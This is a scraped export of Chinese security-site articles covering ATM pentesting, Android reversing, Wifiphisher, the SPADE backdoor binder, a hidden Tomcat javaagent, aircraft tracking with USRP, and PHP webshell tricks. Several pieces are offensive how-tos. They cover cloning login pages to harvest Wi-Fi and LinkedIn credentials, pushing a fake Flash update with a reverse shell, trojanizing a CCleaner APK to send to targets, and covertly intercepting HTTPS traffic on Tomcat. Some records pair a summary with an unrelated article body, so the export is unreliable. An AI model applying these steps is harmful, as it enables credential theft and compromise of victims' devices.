xp，众所周知它们是非常容易被黑的。电子账户资金的转移会经过通信链路、电脑和ATM终端，这三个组件都需要接受安全防护措施。我们需要对它们进行调查评估，以分析ATM机的整体安全。漏洞评估和网络渗透测试这两个工作在保证ATM机安全时非常重要的，我们在网络渗透测试会检查ATM机的网络层面的漏洞。由于ATM机会与后端服务器进行通信，所以它必须接入网络。通过获取ATM机的IP地址，我们可以开始网络渗透测试之旅。由于ATM网络一般会与银行网络隔离，所以测试人员需要与ATM网络一个段才能开始测试。我们可以通过nessus去扫描ATM机上开放的端口和运行的服务，以及相关服务的存在的漏洞。同样，我们可以运行全端口扫描器NMAP去确定ATM机上开放的TCP和UDP端口和相应的服务。此外，nessus认证扫描可以用来识别ATM机上安装的脆弱组件，比如Adobe、IE浏览器等等。同时，我们还需要对操作系统做好安全配置。由于大部分ATM机都运行的是windows操作系统，它们必须按照最佳的配置来减少黑客的攻击面。比如，我们可以做以下的配置：补丁和更新：经常检查操作系统更新和安全补丁系统访问和身份验证：检查密码和账户锁定相关策略、用户的权限策略等等审计和日志：检查相关事件、应用和安全日志、审计策略，以及事件日志的权限用户账户配置：检查管理组的用户、默认用户、guest账户、密码要求和过期时间应用程序安全审计在这里，我们可以分为两类：1.胖客户端渗透测试：多数ATM应用是胖客户端，我们可以在上面执行对应用的渗透测试：敏感信息一般存储在应用配置文件中，认证信息会存在注册表内，还有部分敏感信息会被硬编码到代码之中通过拦截流量，可以篡改操纵服务器和应用之间传递的敏感信息检查应用和数据库之间是否存在明文通信协议反逆向的保护措施2.应用设计审查：在这一点中，我们可以检查应用中的一些安全实践内容：记录到日志文件中的事件类型ATM应用运行使用的特权软件是否会将不同等级的用户进行限制，根据不同的用户ID展示不同的内容访问应用相关文件夹的权限没有密码或者使用老旧密码是否能够成功交易操作系统是否能在应用运行时对其进行访问与后端组件的交互情况检查网络隔离是否有效是否用户输入了无效密码也会进行记录是否每个事务都会强制性需要密码软件是否会泄露输入的密码ATM机的安全解决方案很多ATM机都会运行windows xp，正因为微软不再对它们进行支持，故而许多ATM机供应商会采用一些安全解决方案来减轻攻击和漏洞带来的威胁。这些安全解决方案会限制ATM应用，让它们运行在非常严格的环境下，系统后台只能运行非常有限的服务。这里举两个安全解决方案的例子：Mcafee Solidcore和Phoenix Vista ATM。Mcafee SolidcoreMcafee应用控制器会运行在ATM机操作系统上，用于限制那些未授权的可执行文件。这个解决方案适用于白名单策略，比如那些应用、进程和服务。它通过Integrity Monitor去跟踪项目代码和配置的更迭情况，保护那些不能更改的配置和密码。当然，ATM应用和应用相关文件会首先列入白名单进行执行。Phoenix Vista ATMPhoenix Vista ATM是Phoenix Interactive Design公司的产品，后来被Diebold收购，这个解决方案集成入了ATM应用。该应用会检查文件的完整性，任何对系统相关的重要文件的篡改都会导致系统关闭，从根本上杜绝了未授权应用的修改行为。该架构包括3层：OS &lt;–&gt; XFS &lt;–&gt; Vista ATMXFS（金融服务扩展）为windows平台提供了客户机-服务器体系结构，特别是那些金融行业特有的外部设备（如ATM）。这是一个由欧洲标准化委员会搞出的一套东西，缩写为CEN/XFS。XFS提供了一个通用的API，目的是方便各制造商的金融设备进行访问。Vista ATM和XFS层通信，它会给硬件发布命令，让其进行现金出纳。任何未授权的对XFS文件的修改，都会触发Vista ATM应用将机器强制重启。在重启4-5次后，它会自动进入维护模式，不允许用户执行任何事务。安全解决方案ATM机中的安全测试解决方案也是相同的，它最终的目标是获取操作系统的权限，或者调试应用相关文件来查看应用行为。攻击者可以创建一个恶意软件，使用XFS组件向系统硬件发出命令。部分测试用例如下：检查USB功能是否启用，使用Konboot去USB启动插入USB设备，通过它去引导系统因为大多数安全解决方案会在引导时接管系统，我们需要在系统引导的时候按住“Shift”键不放开。这会打破ATM系统的原本的节奏，最终停在windows登陆界面。如果你知道有效的用户名，输入并按下“Enter”键，就能无密码访问系统。但是如果你不知道用户名，你可以试试默认的“Administrator”用户，因为大多数ATM并没有禁用它。还有种方法，你可以使用Hiren引导USB启动，这可以不需要windows登陆直接访问文件系统。运行代码授权的测试：检查是否启用USB功能，试着直接从USB设备运行未授权的代码，或者使用USB的自动运行功能代码保护的相关测试：将应用程序相关文件移动到另一个位置，对其修改或者删除检查相关流程是否修改：将未经授权的文件重命名为一个安全软件的进程名，这可能导致应用程序启动时会执行那个未授权文件通过注册表进行未授权威胁检测：检查是否重要的注册表键可以被修改，或者未授权软件是否可以在windows启动目录执行ATM的最佳安全实践银行可以通过进行安全最佳实践来减少攻击者的攻击面，这部分也可以分为三类：对物理攻击的防护防止对银行卡的扫描窃读检测和防止伪造的ATM接口对银行卡的截取防止肩窥（偷瞄）攻击实现DV捕捉ATM用户面部特征和记录时间戳防止火灾爆炸防止纸币和账单的未授权访问。电力和网络入口的保护禁用未使用的网络和电源端口ATM需要固定在地板上防止抢劫，使用传感器识别是否机器受到冲击。使用闭路摄像头+保安监控逻辑攻击保护设置难猜测的引导和BIOS密码，防止黑客进行未授权的系统引导，大多数ATM都会默认配置启动密码对USB功能和未授权硬盘的保护强化系统和打上最新的补丁给ATM机上的应用、服务、进程加白名单ATM机系统上需要用最小特权的用户运行文件完整性检查确保事务日志的安全使用安全信道进行通信交易在ATM应用上配置安全最佳实践进行防病毒保护ATM网络和其他网络隔离防止tyupkin/ploutus等恶意软件的侵害防止欺诈攻击限制卡的使用地域芯片卡+密码来减轻卡复制+读卡攻击的危害实施行为检测，甄别不寻常的交易结论随着技术的发展，黑客可能会想出越来越多的方法来入侵ATM机。银行需要保证ATM机的安全，维护客户的信任，保持部署最新的安全解决方案，尽量减少黑客的攻击面。笔者建议，通过增强物理安全和逻辑安全，有助于提升ATM机通信的安全性。","2016-11-18 12:37:49","系统安全","ATM机渗透测试的攻防实践","http://nsoad.com/Article/system/20161118/801.html"
"5ccbfae44f2f0a0a7a69c0dc","Ruler是一款能够通过MAPI/HTTP协议与Exchange服务器交互的工具。其目的在于测试outlook客户端的邮件规则，规则详情请见：Silentbreakblog。Silentbreak对该攻击行为的研究非","Kong","前言本文将主要介绍个人在Android App逆向分析时常用到的一些工具和小技巧。说起Android 逆向，就不得不提到常用的逆向分析神器了，IDA，jadx，Android Killer，JEB。常用工具介绍jadx是一款非常不错的apk反编译工具，可以直接将apk转换成java源码，代码还原度高，且支持交叉索引等等，以一款开源工具为例，反编译后结构图代码显示效果：排除混淆的影响外，整体看来代码的显示效果基本是跟原工程一样的，非常有逻辑感，右键还可以查看方法和变量的引用，但是jadx的缺点也很多，速度较慢，且不支持变量，方法重命名等等，在针对混淆代码分析时有些力不从心，这里就推荐另一款工具JEB。JEB是一款非常不错的Android逆向分析工具，新版的JEB也已经支持了app动态调试，但由于不稳定性，暂时还不推荐使用，本文使用版本1.5，由于大部分人都接触过JEB，也知道JEB的常见特性，本文就主要讲解JEB的另一个功能，脚本功能，示例app为RE管理器。反编译后可以看到：方法中多数字符串已经被转换成了byte数组，这在逆向分析时会比较头大，为了解决这一问题，我们可以尝试写个脚本来还原这些字符串，打开idea，新建一个java工程，导入jeb.jar（该文件在JEB目录下可以找到），第一步，需要知道JEB需要遍历的方法是什么，这里调用了new String方法将byte数组转换成string，那这里就需要匹配new String这个方法，如下接下来需要让JEB枚举所有方法这里主要就是利用JEB的插件功能枚举所有引用到该签名的方法，好处就是节省后面匹配替换的时间，找到关键处后自然就开始替换和解密操作了。这里主要就是遍历和迭代所有方法中的元素，取到元素后首先需要进行过滤，因为是new String，所以需要判断当前类型是否为New，是的话再去匹配签名值是否跟上面设置的一致，当匹配成功后就可以在元素中取值了，取到值后还需要进行相应的处理，将类型转换成我们需要的byte数组，今后再进行解密和替换，整体逻辑和实现并不复杂，上面的截图也都做了详细的备注，丢张处理后的截图：这样分析起来就轻松多了，当然这里只是简单的举了个new String的例子，同样该脚本稍作修改可以解密如des，aes，base64等加密编码操作。当然说到逆向工程，不得不提的工具当然是IDA，作为一个适应多种平台的逆向分析工具，在安卓上的使用率也非常高，强大的反汇编功能以及F5转伪C代码功能都给分析者提供了便捷，下面以某个CrackeMe演示：常见的native方法有静态注册和动态注册两种形式，静态注册均已java开头，以类的路径命名，所以可以很轻松的找到，双击该方法即可来到汇编代码处，F5后发现代码丢失了很多，如下图：在汇编代码状态下按下空格键即可切换至流程图，如下：发现该方法被识别出了两个入口点，从而导致很多代码未被识别到，找到第一个分支的结束地方选择菜单栏的Edit-&gt;function-&gt;removefunction tail，之后在修改过后的地方点击菜单栏Edit-&gt;other-&gt;forceBL call 即可，之后再此F5即可正常显示所有代码而动态注册方法较静态注册在寻找关键点时稍加麻烦一点，而动态注册势必会在jni_Onload中去处理这些函数，以某so为例，F5后代码如下这里会看到很多的偏移地址，其实是指针在jniEnv中的相对位置，此时可以通过导入jni头文件来自动识别，在网上可以很容易下载到这个文件，导入后右键Convert to Struct后代码如下：这里已经看的很清晰了，调用了RegisterNatives方法注册了两个方法，off_8004则是记录了该方法的偏移地址，双击进入：这里已经看到了两个方法对应的内容，_Z10verifySignP7_JNIENVP8_jobect和_Z13getentyStringv，双击即可跳转到该方法中，当然这些对于ida来说根本都是基础功能，而且新版本的IDA支持直接对字节码进行patch，无需像之前一样记录修改地址，使用16进制编辑器对字节码进行修改，示例如下：在000025C6处我调用了一个检测当前是否处于调试状态的方法，如果程序被调试器连接上，则会自动崩溃，而readStatus是个void方法，本身不带参数和返回值，思路很简单，nop掉该方法再重新打包即可正常调试，选择菜单栏上的Options-&gt;General此处将0改为4即可此时每条指令对应的机器码已经显示出来，可以看到readStatus是个arm指令，修改方法很简单，常见的nop方法可以使用全0替换机器码点击到修改指令后选择菜单栏的Edit-&gt;patch program-&gt;changebyte，修改前4个字节为00 00 00 00即可，效果如下：可以看到反调试方法已经被清除掉了，那么如何保存修改后的文件呢，也很简单，点击菜单栏的Edit-&gt;patchprogram-&gt;Apply patches to Input file，直接点击ok即可，当然ida的小技巧还有很多，比如在动态调试时改变android_server的默认端口即可过滤掉反调试对端口23946的检测，命令为-p123 ，123为端口号，记得-p和端口号之间是没有空格的。最后要介绍的就是Android Killer了，ak是一款不错的apk反编译集成工具，有良好的smali显示效果和编辑功能当然作为一个反编译工具，这些都是最基本的功能，ak有一项强大的功能是代码插入，可以对代码进行稍加的封装，即可实现快速插入代码，比如个人实现的log插桩插件，是在开源项目LogUtils的基础上转换成了smali插件，支持一键输出任意基本类型的数据以及json,Intent等数据类型，使用方式也很简单，右键选择插入代码即可代码就1句话，其中p0是需要打印的寄存器，在静态方法中p0代表是是第一个入参，在逆向工程上，代码插桩可以很好的帮助我们进行数据的分析，这些插件我都发布到了网络上，都可以下载到。总结本文主要介绍了Android App逆向时常用的工具和他们的一些使用小技巧，但逆向单靠一样工具和常见的技巧往往还是不够的，需要大家的尝试和耐心以及自身对逆向的钻研精神。","2016-10-23 16:40:50","安全工具","Android App常见逆向工具和使用技巧","http://nsoad.com/Security-tools/20161023/tools-628.html"
"5ccbfae44f2f0a0a7a69c0dd","Wifiphisher是一种安全工具，可以对WiFi客户端进行自动受害者定制的网络钓鱼攻击。Wifiphisher是用Python编写的，由希腊安全研究员George Chatzisofroniou开发。","RcoIl","背景Wifiphisher是一种安全工具，可以对WiFi客户端进行自动受害者定制的网络钓鱼攻击。Wifiphisher是用Python编写的，由希腊安全研究员George Chatzisofroniou开发。Wifiphisher由于其非常规的攻击方式，在无线安全领域造成了浪潮。与传统WiFi攻击不同，它不涉及任何握手捕获或密码爆破，任何测试无线网络的人都习惯了。Wifiphisher的攻击能否成功主要依赖于能否使得受害者将无线网络密钥或更多的资料交付给您，如下所示。Wifiphisher的操作可以归纳为3阶段攻击：1 启动一个假的无线接入点（AP） - 也被称为""evil twin""2 强制受害者通过向他们和他们所连接的接入点发送去认证数据包，从合法AP中去认证。3 让他们连接到你的evil twin，并为他们提供一个网页，让他们给你无线网络密码。看起来似乎是有很多的工作量，但是Wifiphisher的最好的一个地方是它的自动化。以上所有这些都可以通过操作者的最小工作量的交互来完成。Wifiphisher的认证攻击的灵感来自于Dan McInerney的Wifijammer，您应该肯定会检查出来。要运行Wifiphisher，您将需要：一个Linux系统。2个无线网卡; 一个能够进行注射（用于去认证攻击）。我更中意阿尔法卡，所以我会推荐其中的一个; 像Alfa AWUS036H或Alfa AWUS051NH。玩转Wifiphisher最初构建了Wifiphisher来捕获无线网络凭据。在撰写本文时，它有3个网络钓鱼场景; 它最受欢迎的是下面的“固件升级”页面。Wifiphisher使用此网页来说服他们需要进行路由器固件升级，从而诱骗目标的无线网络密码。一旦用户输入密码，它将显示在操作员的终端上，Wifiphisher会关闭假接入点，这样目标就不知道发生了什么事情。添加钓鱼场景使用Wifiphisher几个星期后，我认为添加更多的钓鱼场景到它的武器库将是一件好事。不幸的是，由于版权原因，Wifiphisher不能包含任何第三方材料（如徽标或专有模板）; 所以没有流行的社交媒体网站的钓鱼网页但是，由于我无意在Github上发布这个修改版本，所以我认为这样做还是可以的。创建网络钓鱼页面通常很简单; 将原始的钓鱼页面下载到您的系统上，并修改页面的登录表单以收集凭据。与Wifiphisher，唯一的缺点是，正在执行的攻击时，BOTH其经营者（你），目标将失去互联网连接，这意味着所有的网络钓鱼网页需要是独立的，即它们不能依赖于任何在线资源。幸运的是，使用wget下载他们的所有要求的网页将会非常简单：$ wget -E -H -k -K -p &lt;insert URL here&gt;运行这个应该得到所有的文件你需要设置你的钓鱼页面。我将这篇文章使用LinkedIn的登录页面。Wifiphisher 通过记录以字符串“ wfphshr ” 为前缀的所有POST请求来以捕获凭据，这意味着我们必须在我们的网页中编辑用户名/电子邮件和密码字段，并将其附加到“ wfphshr ” 。前缀可以是任何你想要的，只要Wifiphisher的代码和网页中的前缀是统一的。登录表单方法也必须是POST请求，而且现在几乎请求方法都是这样。最后，我们将新的网络钓鱼选项添加到Wifiphisher的菜单中。就是这样,需要准备一个使用的钓鱼页面，现在我只需要重复所有想要添加的场景的过程。从那以后，我改变了Wifiphisher的钓鱼页面菜单，我添加包括所有的网络钓鱼的选项。测试1.运行Wifiphisher并选择最强的接口。注意：我还修改了Wifiphisher的界面选择菜单。如果运行不带任何参数,Wifiphisher将自动选择最强大的无线接口作为干扰界面。它通过扫描在该地区所有无线网络所有可用的无线适配器,无线网络接口,可检测最被选为干扰界面。这是好的和工作相当好于大多数运行，但我发现，在一些场合，错误的（弱）接口将被选中。如果选择了这一些接口，攻击阶段可能提示运行失败，因为大多数情况下，笔记本电脑内置的网络适配器不支持数据包注入。你仍然可以用手动指定的参数运行Wifiphisher干扰界面,但我仍然想要改变默认运行选项使用手动界面选择。选择我是受Wifite的接口。2.选择一个网络钓鱼场景3.选择一个WiFi网络的目标，并等待Wifiphisher启动假的AP。4.目标开始连接到你的evil twin目标方：无论他们浏览的网站如何，目标都会为您选择的网络钓鱼页面提供服务。收获凭证\注意：我也不得不修改Wifiphisher的请求处理程序。它配置为在1个用户输入凭据后自动关闭。但是，由于我希望能够收集超过1个用户的凭据，所以我删除了自动关机。进一步说如果我们在一个目标上能够显示任何网站页面，而他们能成功地连接到我们的假冒AP，那为什么不能成为有这么一个页面，其建议他们下载并安装一些“ 有用” 的软件？选择个大家最喜欢的的Adobe Flash Player？1.首先下载安装Adobe Flash Player页面2.接下来，我们将下载按钮指向我们系统上托管的文件（adobe_ update.exe）。我们还将重写页面的文字，以说服我们的目标下载更新文件。3.准备payload。有无数的方法可以做到这一点，我现在无法进入各种可用的选择。所以在这篇文章中，我会用shellter生成Metasploit的反弹shell的payload到任何Windows可执行文件。你可以改变可执行文件的图标Adobe的标志，使其更有说服力。4.启动Wifiphisher 并选择有效载荷下载选项。当选择“Adobe Flash Update” 方案时，我添加了有效载荷选择提示。我们在这里所做的一切都是给我们准备的有效载荷的完整路径。5.等待目标连接到我们。6.目标方：目标服务器是Adobe 更新页面，当他们尝试浏览并确信下载并安装更新。我们甚至将我们的目标扫描与他们的AV首先，以防万一更新是不合法的。7.目标运行更新文件，我们拿到反弹的shell注意：我建议使用连接到公共Metasploit侦听器的payload，所以当你关闭你的假冒ap，无论用户连接到下一个网络，你将成功获得一个shell。结论在捣鼓Wifiphisher的时候发现了很多乐趣。我是不是能贡献任何的情景在这个岗位到正式版 ，因为所有潜在的侵犯版权前面提到过，但我没有贡献一个通用的无版权的有效载荷的下载情况。如果您想自己尝试上面的有效负载攻击，可以在官方的Wifiphisher中查看“浏览器插件更新”情景。","2017-04-05 11:27:34","安全工具","玩转社会工程学之WiFi钓鱼工具包：WifiPhisher","http://nsoad.com/Security-tools/20170405/tools-1127.html"
"5ccbfae44f2f0a0a7a69c0de","p.s:经数名网友要求，我们贴出一篇关于HELEN的官方报道：《“黑客”称手机销售网站有漏洞 花1元能中iPhone》，请各位勿相信HELEN所说的收徒、黑站等，在网络上不","silence","p.s:经数名网友要求，我们贴出一篇关于HELEN的官方报道：《“黑客”称手机销售网站有漏洞 花1元能中iPhone》，请各位勿相信HELEN所说的收徒、黑站等，在网络上不要轻易给他人汇款，以免钱款丢失。昨日，黑客HELEN的博客遭遇和谐渗透小组攻击，HELEN的真实姓名支付宝常用密码等全部被公开。此前其博客也遭到过其他黑客的攻击，甚至是被域名劫持，黑客新闻网就有详细文章。但是他拒绝承认，称并非他博客。人不要脸，天下无敌。他不承认也没有啥办法。HELEN：国内比较出名的“黑客”，据称曾攻击过很多黑客网站并在其首页挂上自己的名字以显示他的“路过”水平，曾因攻击ESET NOD32 官网，锒铛入狱。据知情人透露，其实那并不是他的杰作，许多网站被黑并留有他的名字是因为他从别的黑客手里拿到权限（WEBSHELL）然后再到网站首页去显示他的“路过”水平。其实他本身并没有多少技术。攻击ESET官网的HELEN，出狱后称自己已成为网警，大多数人不信，因为他比很多黑客还要邪恶并且参加了许多所谓的”黑客”小组。自称其百度博客天下无敌，无能能黑，惹恼了许多高手。曾经的博客：http://hi.baidu.com/305536777/ 就是因他此言变成了“黑客HELEN的狗窝”日前自称以社会工程学的攻击方式攻击了“核攻击”的博客，并在其首页谩骂博主。当晚其博客遭遇大量DDOS攻击（分布式拒绝服务攻击），导致博客一度无法打开。昨日和谐渗透小组再度攻击了他的博客，社工了其所有资料及敏感信息，并且在他现在被黑的博客发布。以下是被黑截图：为了避免他再次不承认及为了保持本文的真实性再弄两张百度快照给大家看。注意看红框部分。大家懂得。现在被黑地址：http://hi.baidu.com/qq305536777和谐渗透小组：这个小组我在前面一篇文章已经介绍过了大家可以看“黑客熙雅博客被黑”。HELEN自称社工及入侵高手，并此以大牛自居，但没有想到自己会被黑好几次。从这事情看来，希望各位黑客朋友们能够引以为戒，记住一句话：人外有人，天外有天。你不是最牛逼的，那就请把牛逼还给牛。曾经有大牛说过，国内黑客界有什么动静十有八九十HELEN搞起来的。所以不要管他，做好自己的事情，把他当作一个笑话看，笑笑就好，骂他或者黑他是没有多大意义的，因为那样会让人觉得你跟他没有区别，关注HELEN你丫就是装逼。想了解更多关于“黑客”HELEN的事迹可以上百度搜索“HELEN 黑客”。还是那句话，笑笑就好，不用太较真。","2016-08-04 10:13:59","网络安全","黑客HELEN装逼被社","http://nsoad.com/Article/Network-security/20160804/264.html"
"5ccbfae44f2f0a0a7a69c0df","Weevely简介Weevely是一款python编写的webshell管理工具，作为编写语言使用python的一款工具，它最大的优点就在于跨平台，可以在任何安装过python的系统上使用。本文介绍的","Kong","SPADE，一款安卓手机的后门控制工具，安全研究人员可以以此了解和研究安卓后门原理。首先，我们从网站www.apk4fun.com下载apk文件，如ccleaner。然后，我们安装spadegit clone https://github.com/suraj-root/spade.git 之后，利用以下命令开始捆绑恶意载体./spade.py /root/Desktop/ccleaner.apk有6种不同payload可供选择，设置完lhost和lport，将会生成恶意payload选择设置listener之后，一个新的apk生成了好了，你可以向目标手机发送apk或下载链接了，apk程序安装的同时，将会执行我们设置的恶意payload。之后，通过命令查看实际控制效果sessions –i 1","2016-10-25 02:12:48","安全工具","安卓手机的后门控制工具SPADE","http://nsoad.com/Security-tools/20161025/tools-632.html"
"5ccbfae44f2f0a0a7a69c0e0","最近偶然接触到一个Java的不常用的特性：instrument。简单来说，这个特性允许你在程序运行之前改变任意类文件的字节码。简单的instrument例子大家可以百度，相当多。","kong","最近偶然接触到一个Java的不常用的特性：instrument。简单来说，这个特性允许你在程序运行之前改变任意类文件的字节码。简单的instrument例子大家可以百度，相当多。而在运行Java程序的时候，只需要加上一个选项即可运行写好的instrument jar包，如：java  -javaagent:agent.jar -jar helloworld.jar。那么回到这次的主题，如何在tomcat中利用这个特性做到提权和劫持数据呢？提权的思路其实可能有些小伙伴已经想到了。就是根据这个特性写一个Java程序，打包成jar（比如agent.jar），然后放到tomcat的lib里或者其他地方，然后在catalina.bat中找个隐蔽的地方加上如下一行：set CATALINA_OPTS=%CATALINA_OPTS% -javaagent:绝对路径\agent.jar=参数当管理员启动tomcat的时候就会执行agent里的Java代码了。当然，这么做需要能上传文件以及对catalina.bat有写权限。其实当你能登录服务器或者有shell的时候，已经可以做很多事了。提权可能根本不需要通过tomcat这种途径。那么是否还能做点别的呢？根据这个特性，其实还可以拦截所有http请求的数据。据本人所知，所有Java web项目里的请求处理类都继承了HttpServlet这个抽象类，包括Spring。所以你只要通过这个特性，修改HttpServlet的代码就可以获取和改动所有request和response的头以及数据，要把数据发走也不是问题，加个URLconnection的处理就行。以下给一个简单的示例，项目截图：Transformer类，功能相当于把Java代码插入了HttpServlet中。几乎可插入任意变量和方法，但有些写法上稍微与一般的java不一样，且尽量使用core java：package org.xf.agent;import java.io.ByteArrayInputStream;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.reflect.Modifier;import java.security.ProtectionDomain;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;public class ServletTransformer  implements ClassFileTransformer{@Overridepublic byte[] transform(ClassLoader loader, String className,Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,byte[] classfileBuffer) throws IllegalClassFormatException {if(className.equals(""javax/servlet/http/HttpServlet"")){return transformClass(classfileBuffer);}return classfileBuffer;}private byte[] transformClass(byte[] classfileBuffer) {try {            ClassPool cp = ClassPool.getDefault();            CtClass cc = cp.makeClass(new ByteArrayInputStream(classfileBuffer));            CtMethod[] ms = cc.getDeclaredMethods();            for(CtMethod method: ms)            {               //只改动service方法就够了               if(method.getName().equals(""service"")&amp;&amp;Modifier.toString(method.getModifiers()).equals(""protected""))               {               method.insertAfter(""resp.setHeader(\""Server\"",\""JBoss\"");"");               }            }            byte[] byteCode = cc.toBytecode();            cc.detach();            return byteCode;        } catch (Exception ex) {            ex.printStackTrace();            return null;        }}}Agent类：package org.xf.agent;import java.lang.instrument.Instrumentation;public class ServletAgent {public static void premain(String agentArguments, Instrumentation instrumentation) {   instrumentation.addTransformer(new ServletTransformer());}}导出为可执行Jar，用7z编辑Jar包里的MANIFEST.MF文件，加上一行：premain-Class: org.xf.agent.ServletAgent样本如下图所示：然后随便建个Web项目，servlet代码如下：@WebServlet(""/Basic"")public class Basic extends HttpServlet {private static final long serialVersionUID = 1L;         /**    * @see HttpServlet#HttpServlet()    */   public Basic() {       super();       // TODO Auto-generated constructor stub   }/*** @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)*/protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.getWriter().print(""Hello"");}/*** @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)*/protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.getWriter().print(""Hello"");}}别忘了在tomcat的catalina.bat中加入那一行，建议使用绝对路径，然后下面是运行效果，可以看到响应头中出现了Server: JBoss。这样做的隐蔽性很好，因为几乎不会有管理员去检查lib里的jar是不是多了一个，catalina的配置更是几百年都不一定检查一次。而无论项目war包如何换，都不影响这个隐藏jar包的。基本只要这个程序不导致什么重大的性能问题，就很难被发现。并且由于这个方法是从内部修改程序，HTTPS加密的内容也可以修改和盗取。这并不是一个Bug或者漏洞，而是一个完全正规的Java特性，所以。。。应该是不可被修复的吧。","2016-12-06 16:20:16","Web安全","Java Web本地提权以及数据劫持思路（以Tomcat为例）","http://nsoad.com/Article/web/20161206/891.html"
"5ccbfae44f2f0a0a7a69c0e1","刚接触蓝牙，于是玩了那么一下下，现在分享出来，希望能与大家一起学习先来了解蓝牙哈 (&macr;▽&macr;)~（如果哪里错啦，希望大大萌轻点打~(>﹏<)~）初次相识","kong","0×00 前言USRP是数款流行的SDR硬件中功能和应用都相对成熟的一款产品，从WIFI协议、ZigBee协议、RFID协议、GSM通信系统、LTE 4G通信系统到飞机通信、卫星通信USRP都能很好的进行支持。软件开发工程师可以用它开发应用，安全工程师则用它来测试、研究相关的无线通信协议。很大一部分玩过电视棒的小伙伴都使用过电视棒+dump1090的方案实现过追踪飞机飞行轨迹这一功能。之所以能够很容易的跟踪飞机,是因为航空CNS(通信导航监视)系统里大量采用非常古老的无线标准。（电视棒+dump1090 2D）（图片来源：http://slideplayer.com/slide/2547225）二次监视雷达(SSR)系统,地面站发射1030MHz的查询信号,飞机接收到此信号之后在1090MHz发射应答信号,信号中包含了飞机的一些信息,显示在空管的雷达屏幕上。还有空中防撞系统(TCAS),飞机可以自己发射1030MHz的查询信号,其他飞机接收到此信号之后在1090MHz发射应答信号,因此一架飞机得以”看到”周围的飞机。由于以上的查询-应答模式在飞机很多的时候显得效率不是那么高,因此新出现了一种ADS-B方式。在ADS-B中,每架飞机不等查询,主动广播自己的信息,这时监视和防撞需要做的就仅仅是接收了。在通用航空当中ADS-B信号经常在978MHz发射，在商业飞行中ADS-B信号经常在1090MHz发射。0×01 HardWarePC：Ubuntu OR MacSDR：USRP、天线、USB数据线0×02 Software2.1安装pip、pybombsapt-get updateapt-get install gitapt-get install python-pippip install --upgrade pippip install git+https://github.com/gnuradio/pybombs.gitpybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.gitpybombs prefix init /usr/local -a myprefix -R gnuradio-defaultpybombs install gqrx gr-osmosdr uhd以上内容是Ubuntu下安装SDR相关软件的方法，在Mac OSX中则可以使用mac port 进行安装。2.2下载USRP镜像使用pybombs安装完UHD（USRP Hardware Driver）后还需下载固件镜像以及FPGA镜像，执行：python  /usr/local/lib/uhd/utils/uhd_images_downloader.py插入USRP后可执行：uhd_find_devices或者uhd_usrp_probe来查看设备信息：2.3编译安装gr-air-modes:git clone https://github.com/bistromath/gr-air-modescd gr-air-modesmkdir buildcd buildcmake ..makesudo make installsudo ldconfig2.4 安装谷歌地球Ubuntu 32 bit:wget http://dl.google.com/dl/earth/client/current/google-earth-stable_current_i386.debUbuntu 64 bit:wget http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.debsudo dpkg -i google-earth-stable_current_amd64.debMac osx：wget https://dl.google.com/earth/client/advanced/current/GoogleEarthMac-Intel.dmg0×03 解码飞机信号&amp;导入谷歌Earthcd gr-air-modes/apps/./modex_rx -K test.kml 执行App目录下的modex_rx，开始接收并解码来自飞机的1090MHz无线信号，-K参数即把解码到的航班号、经纬度、飞行速度等等保存为.kml文件。打开谷歌地球：添加–&gt;网络链接–&gt;新建链接名称，以及kml文件的绝对路径：设定刷新时间，以及是否在刷新时前往该视图： 如果开启刷新前往视图后，google-earth会自动定位到你所在的区域并显示接收到区域上空的飞机。    (飞机飞行轨迹 3D)地图上显示飞机的航班号，双击飞机图标可以显示该飞机高度、飞行速度等信息。 0×04 演示视频0×05 referhttps://kb.ettus.com/Implementation_of_an_ADS-B/Mode-S_Receiver_in_GNU_Radiohttp://www.freebuf.com/articles/wireless/77819.htmlUSRP B200: Exploring the Wireless WorldAircraft Tracking with Mode S: Modez &amp; Aviation Mapperhttps://media.blackhat.com/bh-us-12/Briefings/Costin/BH_US_12_Costin_Ghosts_In_Air_WP.pdfhttps://www.rs-online.com/designspark/10-things-you-can-do-with-software-defined-radio","2016-11-15 21:07:03","无线安全","使用USRP探索无线世界 Part 1：USRP从入门到追踪飞机飞行轨迹","http://nsoad.com/Article/wifi/20161115/781.html"
"5ccbfae44f2f0a0a7a69c0e2",,"kong","这篇文章不是给 PHP 程序员看的，而是给渗透测试爱好者准备的，\(￣︶￣*\))。本文不是 PHP 教程，本文只针对 PHP 的各种奇淫技巧进行整理和证明，在进行渗透测试（WEB 安全）的学习中，经常需要涉及到 PHP 编程，或者 PHP 编写 Webshell 或者一句话木马，一般的 PHP 马经常被各种软件发现被杀。与此同时，网络经常流传一些免杀马（当然免杀一句话很有可能藏后门大家都是知道的），那么那些免杀是怎么做出来的？打开看，可能就是非常难看难以阅读的 PHP 代码（为了混淆各种杀软的侦察）。 当然，怎么样写出那种奇奇怪怪的东西呢？这就取决于你对 PHP 这门语言的了解程度：你是一个 PHP 开发者，通过 PHP 培训获得一定的技能？还是一个渗透测试人员，通过平时在渗透测试过程中接触 PHP，查看 PHP 官方手册学习 PHP。   嗯……不管你是怎么样的契机接触了 PHP，并且看到了这篇文章，我都希望你看到这篇文章的时候，能够知道一些之前不知道的东西；或者你都对这些技巧了然于胸，能够帮助你回忆这些很有趣的 PHP Trick。 PHP 中的大小写当然这个东西对于开发者来说，其实是没什么太大的作用：没有哪个 Boss 允许你把 PHP 中的关键字写的参差不齐，大小写不一；作为对比，一个渗透测试人员和安全研究者通常需要使用 PHP 大小写来绕过一些限制策略，想这个大家都是渗透体会的，不光 PHP，在 XSS 和 SQLinject 中，大小写的随机组合有时候能达到出其不意的效果对吧？    那么具体来说 PHP 中可以忽略大小写的东西有什么呢？ 用户定义类用户定义函数内置结构关键字那么剩下的基本都要大小写敏感了哦，当然，一定要记住 变量是区分大小写的！ 下面举一些例子，当然这个例子没有实际的意义，但是尽量包含了上面说到的几个点（当然还包含了我们下面要讲的东西）： fUnCtIoN 